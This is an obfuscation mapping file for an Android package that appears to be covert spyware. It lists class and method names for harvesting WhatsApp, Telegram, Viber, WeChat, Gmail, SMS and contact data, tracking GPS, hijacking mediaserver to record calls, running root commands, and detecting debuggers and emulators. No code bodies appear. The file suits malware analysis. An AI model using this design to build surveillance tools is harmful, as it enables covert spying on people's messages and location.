android.media.AmrInputStream -> android.media.AmrInputStream:
    322:336:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$2 -> kso.bv:
    java.util.ArrayList val$conversations$7865b31 -> gY
    com.android.dvci.db.RecordHashPairVisitor val$users -> hu
    com.android.dvci.module.chat.ChatGroups val$groups -> gL
    com.android.dvci.module.chat.ChatTelegram this$0 -> ht
    502:520:long cursor(android.database.Cursor) -> Code
    524:548:void unWrapParticipants(com.android.dvci.module.chat.ChatTelegram$TelegramConversation,byte[]) -> Code
    551:567:void unWrapChat(com.android.dvci.module.chat.ChatTelegram$TelegramConversation,byte[]) -> localvar
com.android.dvci.module.chat.ChatTelegram$Account -> kso.bt$Code:
    int id -> id
    java.lang.String name -> name
    java.lang.String last_name -> hv
    com.android.dvci.module.chat.ChatTelegram this$0 -> ht
    58:58:java.lang.String getName() -> getName
com.android.dvci.module.chat.ChatTelegram$MessageGroupVisitor -> kso.bt$localvar:
    java.util.ArrayList messages -> hw
    com.android.dvci.module.chat.ChatGroups groups -> bE
    com.android.dvci.db.RecordHashPairVisitor users -> hx
    com.android.dvci.module.chat.ChatTelegram this$0 -> ht
    596:635:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$MessageRecordVisitor -> kso.bt$localclass:
    java.util.ArrayList messages -> hw
    com.android.dvci.module.chat.ChatTelegram this$0 -> ht
    648:686:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$TelegramConversation -> kso.bt$instance:
    com.android.dvci.module.chat.ChatTelegram$Account account -> hs
    long uid -> hy
    java.lang.String name -> name
    java.util.ArrayList participants$7865b31 -> hz
    java.lang.String title -> hA
    com.android.dvci.module.chat.ChatTelegram this$0 -> ht
com.android.dvci.module.chat.ChatViber -> kso.bw:
    java.lang.String pObserving -> fi
    java.lang.String dbDir -> hm
    java.lang.String dbChatFile -> hB
    java.lang.String dbCallFile -> hC
    java.lang.Long lastViberReadDate -> hD
    java.util.concurrent.Semaphore readChatSemaphore -> gG
    com.android.dvci.module.chat.ChatViber$ChatViberGroups groups$7ddadd82 -> hE
    java.util.Hashtable hastableConversationLastIndex -> hF
    java.lang.String account -> fV
    45:45:int getProgramId() -> db
    50:50:java.lang.String getObservingProgram() -> dc
    55:56:void notifyStopProgram(java.lang.String) -> file_size
    60:71:void start() -> start
    74:96:java.lang.String readAccount() -> dj
    111:167:void readViberMessageHistory() -> dl
    171:171:com.android.dvci.db.GenericSqliteHelper openViberDBHelperCall() -> dm
    175:175:com.android.dvci.db.GenericSqliteHelper openViberDBHelperChat() -> dn
    181:205:java.util.ArrayList getViberConversations$7fa5c965(com.android.dvci.db.GenericSqliteHelper,java.lang.String,java.lang.Long) -> Code
    215:247:void fetchParticipants(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> instance
    254:332:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.ViberConversation,long) -> Code
    342:356:void updateMarkupViber$256a6c5(long) -> variables
    359:360:void saveEvidence(java.util.ArrayList) -> inst
    363:385:boolean getCurrentCall(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.call.CallInfo) -> Code
    25:25:java.lang.String access$000(com.android.dvci.module.chat.ChatViber) -> Code
com.android.dvci.module.chat.ChatViber$1 -> kso.bx:
    java.lang.String val$account -> gX
    java.util.ArrayList val$conversations$7865b31 -> gY
    com.android.dvci.module.chat.ChatViber this$0 -> hG
    190:199:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$2 -> kso.by:
    java.lang.String val$thread_id -> hc
    com.android.dvci.module.chat.ChatViber this$0 -> hG
    219:240:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$3 -> kso.bz:
    com.android.dvci.module.chat.ViberConversation val$conversation -> hH
    java.util.ArrayList val$messages -> gO
    com.android.dvci.module.chat.ChatViber this$0 -> hG
    265:316:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$4 -> kso.bA:
    com.android.dvci.module.call.CallInfo val$callInfo -> hq
    369:380:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$ChatViberGroups -> kso.bw$Code:
    com.android.dvci.module.chat.ChatViber this$0 -> hG
com.android.dvci.module.chat.ChatWeChat -> kso.bB:
    java.lang.String DEFAULT_LOCAL_NUMBER -> hI
    java.lang.String pObserving -> fi
    java.lang.String myId -> hJ
    java.lang.String myName -> hK
    java.lang.String myPhone -> en
    java.util.concurrent.Semaphore readChatSemaphore -> gG
    java.lang.Long lastLine -> hL
    42:42:int getProgramId() -> db
    47:47:java.lang.String getObservingProgram() -> dc
    56:58:void notifyStopProgram(java.lang.String) -> file_size
    71:73:void start() -> start
    92:202:void readChatWeChatMessages() -> do
    210:272:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.ChatGroups,long) -> Code
    276:306:void saveWechatContacts(com.android.dvci.db.GenericSqliteHelper) -> sort
    309:334:void setMyAccount(com.android.dvci.db.GenericSqliteHelper) -> myarray
    338:366:com.android.dvci.module.chat.ChatGroups getChatGroups(com.android.dvci.db.GenericSqliteHelper) -> quicksort
com.android.dvci.module.chat.ChatWeChat$1 -> kso.bC:
    com.android.dvci.module.chat.ChatGroups val$groups -> gL
    java.util.ArrayList val$messages -> gO
    com.android.dvci.module.chat.ChatWeChat this$0 -> hM
    217:265:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$2 -> kso.bD:
    com.android.dvci.module.chat.ChatWeChat this$0 -> hM
    284:296:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$3 -> kso.bE:
    com.android.dvci.module.chat.ChatWeChat this$0 -> hM
    313:321:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$4 -> kso.bF:
    com.android.dvci.module.chat.ChatGroups val$groups -> gL
    com.android.dvci.module.chat.ChatWeChat this$0 -> hM
    343:359:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWhatsapp -> kso.bG:
    com.android.dvci.module.chat.ChatWhatsapp$ChatWhatsappGroups groups$7ddadd82 -> hN
    java.lang.String pObserving -> fi
    java.lang.String myPhoneNumber -> hO
    java.util.concurrent.Semaphore readChatSemaphore -> gG
    byte[] $ -> $
    48:48:int getProgramId() -> db
    53:53:java.lang.String getObservingProgram() -> dc
    63:69:void notifyStopProgram(java.lang.String) -> file_size
    83:103:void start() -> start
    106:158:java.lang.String readMyPhoneNumber() -> dp
    176:251:void readChatWhatsappMessages() -> dq
    264:285:void fetchGroup(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> localclass
    298:329:java.util.ArrayList fetchConversation(android.database.sqlite.SQLiteDatabase,long) -> Code
    344:417:long fetchMessages(android.database.sqlite.SQLiteDatabase,java.lang.String,long) -> Code
    421:425:java.lang.String clean(java.lang.String) -> class_defs_size
    33:33:java.lang.String access$000$4a088f11(java.lang.String) -> class_defs_off
    java.lang.String $$24d420ae() -> method_ids
com.android.dvci.module.chat.ChatWhatsapp$1 -> kso.bH:
    java.lang.String val$conversation -> hp
    com.android.dvci.module.chat.ChatWhatsapp this$0 -> hP
    274:279:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWhatsapp$ChatWhatsappGroups -> kso.bG$Code:
    com.android.dvci.module.chat.ChatWhatsapp this$0 -> hP
    431:431:boolean isGroup(java.lang.String) -> field_ids_size
com.android.dvci.module.chat.Contact -> kso.bI:
    java.lang.String id -> hQ
    java.lang.String number -> openfile
    java.lang.String name -> name
    java.lang.String extra -> hR
    32:32:java.lang.String toString() -> toString
    38:40:long getId() -> getId
com.android.dvci.module.chat.FbConversation -> kso.bJ:
    java.lang.String account -> fV
    java.lang.String id -> hQ
    com.android.dvci.module.chat.Contact[] contacts -> hS
    long timestamp -> timestamp
    11:17:java.lang.String getTo(java.lang.String) -> data_size
    21:27:java.lang.String getDisplayTo(java.lang.String) -> data_off
com.android.dvci.module.chat.HangoutConversation -> kso.bK:
    java.lang.String account -> fV
    java.lang.String id -> hQ
    long date -> hT
    boolean group -> hU
    java.lang.String remote -> hV
    12:12:boolean isGroup() -> dr
com.android.dvci.module.chat.MessageChat -> kso.bL:
    java.lang.String body -> hW
    java.util.Date timestamp -> cC
    boolean incoming -> closefile
    int programId -> fY
    java.lang.String from -> hX
    java.lang.String to -> hY
    java.lang.String displayFrom -> hZ
    java.lang.String displayTo -> ia
com.android.dvci.module.chat.SkypeConversation -> kso.bM:
    long lastReadIndex -> ib
    java.lang.String account -> fV
    int id -> id
    java.lang.String remote -> hV
    java.lang.String displayname -> ic
    java.lang.String given -> ie
    long timestamp -> timestamp
com.android.dvci.module.chat.SubModuleChat -> kso.bN:
    java.util.concurrent.ScheduledFuture future -> dR
    com.android.dvci.RunningProcesses runningProcesses -> eC
    33:33:void start() -> start
    42:43:void startListen() -> cQ
    47:48:void stopListen() -> cR
    55:62:int notification(com.android.dvci.Standby) -> Code
    68:90:int notification(com.android.dvci.ProcessInfo) -> Code
    94:94:com.android.dvci.module.chat.SubModuleChat$1 getFrequentRunnable$501bdd35(java.lang.String) -> a
    114:114:boolean frequentNotification$552c4dfd() -> dk
    118:118:com.android.dvci.module.ModuleChat getModule() -> ds
    void notifyStopProgram(java.lang.String) -> file_size
    int getProgramId() -> db
    java.lang.String getObservingProgram() -> dc
    19:19:int notification(java.lang.Object) -> Code
com.android.dvci.module.chat.SubModuleChat$1 -> kso.bO:
    java.lang.String val$processInfo -> if
    com.android.dvci.module.chat.SubModuleChat this$0 -> ig
    101:109:void run() -> run
com.android.dvci.module.chat.ViberConversation -> kso.bP:
    java.lang.String account -> fV
    long id -> id
    long date -> hT
    java.lang.String remote -> hV
    boolean group -> hU
    12:12:boolean isGroup() -> dr
com.android.dvci.module.email.Email -> kso.bQ:
    java.util.Date timestamp -> cC
    java.lang.String fromAddress -> ih
    java.lang.String toAddresses -> ii
    java.lang.String ccAddresses -> ij
    java.lang.String body -> hW
    java.lang.String snippet -> ik
    java.lang.String subject -> il
    boolean incoming -> closefile
    32:86:java.lang.String makeMimeMessage$47921032() -> dt
    90:90:boolean isMultipart() -> du
    94:94:java.util.Date getReceivedDate() -> dv
    98:98:boolean isIncoming() -> openfile
    102:102:long getDate() -> getDate
com.android.dvci.module.email.GmailVisitor -> kso.bR:
    boolean initialized -> myclass
    com.android.dvci.module.ModuleMessage moduleMessage -> im
    java.lang.String mailstore -> in
    java.lang.String[] projection -> projection
    java.lang.String selection -> selection
    int lastId -> io
    java.lang.String from -> hX
    com.android.dvci.module.message.Filter filter -> ip
    44:61:java.lang.String decompress(byte[]) -> lua_until
    67:105:long cursor(android.database.Cursor) -> Code
    109:113:void initialize$7b4aafc2() -> dw
    117:117:java.lang.String[] getProjection() -> getProjection
    122:126:java.lang.String getSelection() -> getSelection
    131:131:boolean isStopRequested() -> Q
com.android.dvci.module.message.Filter -> kso.bS:
    boolean enabled -> enabled
    boolean doFilterFromDate -> iq
    java.util.Date fromDate -> ir
    boolean doFilterToDate -> is
    java.util.Date toDate -> it
    int maxMessageSize -> iu
    int maxMessageSizeToLog -> iv
    java.util.Vector keywords -> iw
    85:108:int filterMessage$4876ee43$2566aa8(long) -> mylist
    121:140:boolean equals(java.lang.Object) -> equals
    144:157:int hashCode() -> hashCode
    162:195:java.lang.String toString() -> toString
com.android.dvci.module.message.Mms -> kso.bT:
    boolean SENT -> ix
    java.lang.String address -> iy
    java.lang.String subject -> il
    java.lang.String body -> hW
    long date -> hT
    boolean sent -> iz
    int id -> id
    67:67:java.lang.String getAddress() -> getAddress
    75:75:java.lang.String getSubject() -> getSubject
    87:87:long getDate() -> getDate
    91:91:boolean getSent() -> dx
    111:111:int getId() -> getId
    115:115:boolean isValid() -> isValid
    119:119:java.lang.String getBody() -> getBody
com.android.dvci.module.message.MmsBrowser -> kso.bU:
    java.util.ArrayList list -> iA
    int maxId -> iB
    39:48:java.util.ArrayList getMmsList(int) -> lua_and
    55:117:void parse(java.lang.String,boolean,int) -> Code
    122:141:java.lang.String extractNumber(java.lang.String,java.lang.String[],java.lang.String) -> Code
    148:169:java.lang.String extractBody(java.lang.String) -> b
    183:206:java.lang.String getMmsText(java.lang.String) -> c
    210:226:java.lang.String getAddressNumber(java.lang.String) -> d
    230:230:int getMaxId() -> dy
com.android.dvci.module.message.MsgHandler -> kso.bV:
    com.android.dvci.module.message.MsgHandler$1 handler$2ace4d50 -> iC
    com.android.dvci.module.message.MsgObserver msgObserver$18a11b74 -> iD
    boolean smsEnabled -> eT
    boolean mmsEnabled -> eU
    38:70:void run() -> run
    73:76:void quit() -> quit
com.android.dvci.module.message.MsgHandler$1 -> kso.bW:
    com.android.dvci.module.message.MsgHandler this$0 -> iE
    47:47:void handleMessage(android.os.Message) -> handleMessage
com.android.dvci.module.message.MsgObserver -> kso.bX:
    boolean mmsEnabled -> eU
    boolean smsEnabled -> eT
    long changeDelay -> iF
    android.os.Handler h -> iG
    42:51:void onChange(boolean) -> onChange
    61:62:void run() -> run
    69:122:void actualBrowsing() -> dz
com.android.dvci.module.message.MsgObserver$1 -> kso.bY:
    com.android.dvci.module.message.MsgObserver this$0 -> iH
    35:36:boolean handleMessage(android.os.Message) -> handleMessage
com.android.dvci.module.message.Sms -> kso.bZ:
    java.lang.String address -> iy
    java.lang.String body -> hW
    long date -> hT
    boolean sent -> iz
    java.lang.String read -> iI
    java.lang.String protocol -> protocol
    java.lang.String thread_id -> iJ
    java.lang.String status -> iK
    java.lang.String type -> type
    java.lang.String reply_path -> iL
    int id -> id
    95:95:java.lang.String getAddress() -> getAddress
    107:107:java.lang.String getBody() -> getBody
    123:123:long getDate() -> getDate
    127:127:boolean getSent() -> dx
    143:144:void setThreadId(java.lang.String) -> e
    151:152:void setProtocol(java.lang.String) -> f
    159:160:void setRead(java.lang.String) -> g
    167:168:void setStatus(java.lang.String) -> h
    175:176:void setType(java.lang.String) -> i
    183:184:void setReplyPath(java.lang.String) -> j
    204:204:boolean isValid() -> isValid
com.android.dvci.module.message.SmsBrowser -> kso.ca:
    java.util.ArrayList list -> iA
    int id -> id
    int maxId -> iB
    37:44:java.util.ArrayList getSmsList(int) -> lua_break
    52:208:int parse(java.lang.String,int) -> instance
    212:224:void printColumnsSms(android.database.Cursor) -> localvar
    231:231:int getMaxId() -> dy
com.android.dvci.module.position.GPSLocationListener -> kso.cb:
    void onLocationChanged(android.location.Location) -> onLocationChanged
com.android.dvci.module.position.GPSLocator -> kso.cc:
    android.location.LocationManager lm -> iM
    android.location.LocationListener listener -> iN
    java.lang.String provider -> iO
    android.os.Looper myLooper -> iP
    byte[] $ -> $
    void initLocationUpdates() -> dA
    49:54:void run() -> run
    61:62:void setListener(android.location.LocationListener) -> Code
    65:65:android.location.Location getLastKnownPosition() -> dB
    69:78:void halt() -> aZ
    84:94:void turnGPSOn() -> dC
    100:110:void turnGPSOff() -> dD
    116:137:boolean canToggleGPS() -> dE
    141:145:boolean isGPSEnabled() -> dF
    java.lang.String $(int,int,int) -> $
com.android.dvci.module.position.GPSLocatorAuto -> kso.cd:
    com.android.dvci.module.position.GPSLocatorAuto instance -> iQ
    java.util.ArrayList listeners$7865b31 -> iR
    com.android.dvci.module.position.GPSLocatorPeriod locator -> iS
    long stopDelay -> iT
    boolean gotValidPosition -> iU
    boolean turnedOn -> iV
    37:49:com.android.dvci.module.position.GPSLocatorAuto self() -> dG
    63:116:boolean start(com.android.dvci.module.position.GPSLocationListener) -> Code
    123:130:void unregister$2443f7a3(com.android.dvci.action.SmsAction) -> Code
    135:162:void stop() -> stop
    171:179:void run() -> run
    189:201:void onLocationChanged(android.location.Location) -> onLocationChanged
    208:208:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    214:214:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    220:220:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.dvci.module.position.GPSLocatorDistance -> kso.ce:
    float latitude -> iW
    float longitude -> iX
    float distance -> iY
    com.android.dvci.event.EventLocation rangeObserver$2c18d9f8$1094ee4d -> iZ
    android.location.Location location -> ja
    boolean entered -> ca
    45:46:void initLocationUpdates() -> dA
    49:81:void onLocationChanged(android.location.Location) -> onLocationChanged
    88:88:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    94:94:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    100:100:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.dvci.module.position.GPSLocatorPeriod -> kso.cf:
    int period -> dz
    27:28:void initLocationUpdates() -> dA
com.android.dvci.module.task.Contact -> kso.cg:
    com.android.dvci.module.task.UserInfo userInfo -> jb
    java.util.ArrayList emailInfo$7865b31 -> jc
    java.util.ArrayList paInfo$7865b31 -> jd
    java.util.ArrayList phoneInfo$7865b31 -> je
    java.util.ArrayList imInfo$7865b31 -> jf
    java.util.ArrayList orgInfo$7865b31 -> jg
    java.util.ArrayList webInfo$7865b31 -> jh
    40:41:void add(com.android.dvci.module.task.EmailInfo) -> Code
    44:45:void add(com.android.dvci.module.task.PostalAddressInfo) -> Code
    48:49:void add(com.android.dvci.module.task.PhoneInfo) -> Code
    52:53:void add(com.android.dvci.module.task.ImInfo) -> Code
    56:57:void add(com.android.dvci.module.task.OrganizationInfo) -> Code
    60:61:void add(com.android.dvci.module.task.WebsiteInfo) -> Code
    64:64:com.android.dvci.module.task.UserInfo getUserInfo() -> dH
    76:76:java.util.ArrayList getPhoneInfo$5679c1ce() -> dI
    93:101:java.lang.String toString() -> toString
    105:173:java.lang.String getInfo() -> getInfo
    177:177:long getId() -> getId
com.android.dvci.module.task.EmailInfo -> kso.ch:
    long userId -> ji
    int emailType -> jj
    java.lang.String email -> jk
    30:30:int getEmailType() -> dJ
    34:34:java.lang.String getEmail() -> dK
com.android.dvci.module.task.ImInfo -> kso.ci:
    long userId -> ji
    int imType -> jl
    java.lang.String im -> jm
    30:30:int getImType() -> dL
    34:34:java.lang.String getIm() -> dM
com.android.dvci.module.task.OrganizationInfo -> kso.cj:
    int userId -> jn
    int type -> type
    java.lang.String companyName -> jo
    java.lang.String companyTitle -> jp
    32:32:int getType() -> getType
    36:36:java.lang.String getCompanyName() -> dN
    40:40:java.lang.String getCompanyTitle() -> dO
com.android.dvci.module.task.PhoneInfo -> kso.ck:
    long userId -> ji
    int phoneType -> jq
    java.lang.String phoneNumber -> jr
    30:30:int getPhoneType() -> getPhoneType
    34:34:java.lang.String getPhoneNumber() -> lua_repeat
com.android.dvci.module.task.PickContact -> kso.cl:
    30:52:void addUserPhones(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> Code
    56:73:void addUserEmails(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> localvar
    77:111:void addUserInfos(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> localclass
    115:151:void addUserPA(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> instance
    155:176:void addUserIm(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> inst
    180:205:void addUserOrg(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> variables
    209:230:void addUserWebsite(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> mylist
    233:251:java.util.Hashtable getContactInfo() -> dP
com.android.dvci.module.task.PostalAddressInfo -> kso.cm:
    long userId -> ji
    int type -> type
    java.lang.String street -> js
    java.lang.String poBox -> jt
    java.lang.String neighbor -> ju
    java.lang.String city -> jv
    java.lang.String state -> jw
    java.lang.String postalCode -> jx
    java.lang.String country -> jy
    39:39:int getType() -> getType
    43:43:java.lang.String getStreet() -> dQ
    47:47:java.lang.String getPoBox() -> dR
    51:51:java.lang.String getNeighbor() -> dS
    55:55:java.lang.String getCity() -> dT
    59:59:java.lang.String getState() -> dU
    63:63:java.lang.String getPostalCode() -> getPostalCode
    67:67:java.lang.String getCountry() -> getCountry
com.android.dvci.module.task.UserInfo -> kso.cn:
    java.lang.String completeName -> jz
    java.lang.String userNote -> jA
    java.lang.String userNickname -> jB
    long userId -> ji
    26:26:java.lang.String getCompleteName() -> dV
    30:30:java.lang.String getUserNote() -> dW
    34:34:java.lang.String getUserNickname() -> dX
    38:38:long getUserId() -> dY
com.android.dvci.module.task.WebsiteInfo -> kso.co:
    long userId -> ji
    java.lang.String websiteName -> jC
    28:28:java.lang.String getWebsiteName() -> dZ
com.android.dvci.optimize.NetworkOptimizer -> com.android.dvci.optimize.NetworkOptimizer:
    android.content.Context context -> l
    boolean stop -> aj
    long BeforeTime -> jD
    24:30:void start(int) -> lua_do
    43:70:boolean isNotOptimized() -> ea
    74:87:boolean getResults(long[]) -> localclass
    14:14:long access$002(com.android.dvci.optimize.NetworkOptimizer,long) -> Code
    14:14:long access$000(com.android.dvci.optimize.NetworkOptimizer) -> Code
com.android.dvci.optimize.NetworkOptimizer$1 -> kso.cp:
    java.lang.String val$host -> jE
    com.android.dvci.optimize.NetworkOptimizer this$0 -> jF
    50:64:void run() -> run
com.android.dvci.util.AntiDebug -> kso.cq:
    byte[] $ -> $
    18:22:boolean checkFlag() -> eb
    41:41:boolean checkConnected() -> ec
    50:50:boolean isDebug() -> ed
    java.lang.String $(int,int,int) -> $
com.android.dvci.util.AntiEmulator -> kso.cr:
    int NUMTESTSTM -> jG
    int NUMTESTSNOTM -> jH
    android.telephony.TelephonyManager tm -> jI
    24:53:int checkKeys() -> ee
    58:71:int checkTags() -> ef
    76:87:int checkProduct() -> eg
    92:103:int checkDevice() -> eh
    108:125:int checkBrand() -> ei
    129:148:int checkScaling() -> ej
    153:166:int checkManufacturer() -> ek
    171:188:int checkId() -> el
    193:211:int checkSubscriber() -> em
    216:229:int checkOperator() -> en
    234:263:int checkPhoneNumber() -> eo
    267:294:int isEmu(int) -> lua_else
    298:302:int isEmu(int[]) -> Code
    310:313:boolean isEmu() -> ep
    319:330:boolean isTestEmu() -> eq
com.android.dvci.util.AudioEncoder -> kso.cs:
    java.lang.String audioDirectory -> jJ
    java.lang.String audioStorage -> jK
    boolean call_finished -> jL
    int last_epoch -> jM
    int first_epoch -> jN
    int data_size -> jO
    int sampleRate -> sampleRate
    java.lang.String rawFile -> jP
    byte[] rawPcm -> jQ
    byte[] $ -> $
    50:112:int getInferredSampleRate() -> er
    117:164:boolean encodetoAmr(java.lang.String,byte[]) -> localvar
    170:202:byte[] resample(boolean) -> globalize
    206:337:byte[] decodeRawChunks() -> es
    343:356:void removeRawFile() -> et
    362:362:int getCallStartTime() -> eu
    366:366:int getCallEndTime() -> ev
    374:374:int getAllegedSampleRate() -> ew
    378:378:boolean isLastCallFinished() -> ex
    383:398:boolean createAudioStorage() -> ey
    403:407:java.lang.String getAudioStorage() -> ez
    411:423:boolean deleteAudioStorage() -> eA
    java.lang.String $$24d420ae(int) -> quicksort
com.android.dvci.util.CallBack -> kso.ct:
    java.util.ArrayList callbacks$7865b31 -> jR
    13:14:void register$31aa1d62(com.android.dvci.module.ModuleCall$HC) -> Code
    17:22:void trigger$5d527811$552c4e01() -> eB
com.android.dvci.util.DataBuffer -> kso.cu:
    java.nio.ByteBuffer byteBuffer -> jS
    65:65:int readInt() -> readInt
    76:76:long readLong() -> readLong
    88:89:void read(byte[]) -> lua_while
    102:103:void write(byte[]) -> write
    112:113:void writeInt(int) -> writeInt
    122:123:void writeLong(long) -> writeLong
    126:128:void writeDouble(double) -> writeDouble
    131:132:void writeFloat(float) -> writeFloat
    135:136:void writeByte(byte) -> writeByte
    139:140:void writeShort(short) -> writeShort
com.android.dvci.util.DateTime -> kso.cv:
    long ticks -> jT
    java.util.Date date -> bT
    103:110:java.util.Date getDate() -> getDate
    123:123:long getFiledate() -> eC
    141:172:byte[] getStructTm() -> eD
    193:194:int hiDateTime() -> eE
    203:204:int lowDateTime() -> eF
    214:214:java.lang.String toString() -> toString
    225:229:long getFiledate(java.util.Date) -> localvar
    238:259:byte[] getStructSystemdate() -> eG
com.android.dvci.util.Execute -> kso.cw:
    29:39:com.android.dvci.util.ExecuteResult executeRoot(java.lang.String) -> k
    100:130:com.android.dvci.util.ExecuteResult executeSimple(java.lang.String) -> l
    134:178:com.android.dvci.util.ExecuteResult execute(java.lang.String) -> m
    182:231:com.android.dvci.util.ExecuteResult execute(java.lang.String[]) -> Code
    238:245:boolean executeWaitFor(java.lang.String) -> n
    250:265:boolean executeRootAndForgetScript(java.lang.String) -> o
    269:307:com.android.dvci.util.ExecuteResult executeScript(java.lang.String) -> p
    312:313:void chmod(java.lang.String,java.lang.String) -> myvar
com.android.dvci.util.ExecuteResult -> kso.cx:
    int exitCode -> jU
    java.util.ArrayList stdout -> jV
    java.util.ArrayList stderr -> jW
    java.lang.String executionLine -> jX
    23:23:java.lang.String getStdout() -> eH
    31:38:java.lang.String listToString(java.util.ArrayList) -> mylist
    46:58:void saveEvidence() -> eI
com.android.dvci.util.Instrument -> kso.cy:
    java.lang.String proc -> jY
    com.android.dvci.util.Instrument$MediaserverMonitor pidMonitor -> jZ
    java.lang.String lib -> ka
    java.lang.String hijacker -> kb
    java.lang.String path -> kc
    java.lang.String dumpPath -> kd
    java.lang.String pidCompletePath -> ke
    java.lang.String pidFile -> kf
    boolean stopMonitor -> kg
    java.lang.Thread monitor -> kh
    int killed -> ki
    java.lang.String lid -> kj
    47:51:boolean deleteHijacker() -> eJ
    56:79:boolean installHijacker() -> eK
    83:192:boolean startInstrumentation() -> eL
    196:198:void stopInstrumentation() -> eM
    202:230:int getProcessPid() -> eN
    235:245:void killProc() -> eO
    18:18:boolean access$000(com.android.dvci.util.Instrument) -> Code
    18:18:boolean access$002$453cf8bf(com.android.dvci.util.Instrument) -> localvar
    18:18:int access$100(com.android.dvci.util.Instrument) -> localclass
com.android.dvci.util.Instrument$MediaserverMonitor -> kso.cy$Code:
    int cur_pid -> kk
    int start_pid -> kl
    int failedCounter -> km
    com.android.dvci.util.Instrument this$0 -> kn
    252:253:void setPid(int) -> lua_elseif
    267:296:void run() -> run
com.android.dvci.util.PackageUtils$PInfo -> kso.cz:
    java.lang.String appname -> ko
    java.lang.String pname -> kp
    java.lang.String versionName -> versionName
    java.lang.String apkPath -> kq
    int versionCode -> versionCode
    192:192:java.lang.String toString() -> toString
    159:159:java.lang.String access$000(com.android.dvci.util.PackageUtils$PInfo) -> Code
    159:159:java.lang.String access$002(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> Code
    159:159:java.lang.String access$102(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> localvar
    159:159:java.lang.String access$202(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> localclass
    159:159:int access$302(com.android.dvci.util.PackageUtils$PInfo,int) -> Code
    159:159:java.lang.String access$402(com.android.dvci.util.PackageUtils$PInfo,java.lang.String) -> instance
com.android.dvci.util.Utils -> kso.cA:
    java.security.SecureRandom rand -> kr
    55:68:void sleep(int) -> lua_end
    81:81:long getRandom() -> eP
    85:89:int[] getRandomIntArray$2558076() -> eQ
    93:98:byte[] getRandomByteArray$486860e8() -> eR
    107:107:long getTimeStamp() -> eS
    112:124:byte[] concat(byte[][]) -> Code
    132:142:byte[] getAsset(java.lang.String) -> q
    151:159:java.io.InputStream getAssetStream(java.lang.String) -> r
    164:175:void copy(java.io.File,java.io.File) -> Code
    179:207:boolean streamDecodeWrite(java.lang.String,java.io.InputStream,java.lang.String) -> Code
    214:215:boolean dumpAsset(java.lang.String,java.lang.String) -> sort
com.android.mm.M -> kso.cB:
    byte[] $ -> $
    int $$ -> $$
    6:11:java.lang.String d(byte[],byte[]) -> instance
    15:23:byte[] h2b(java.lang.String) -> s
    30:30:java.lang.String d_4017195795718359079(java.lang.String) -> t
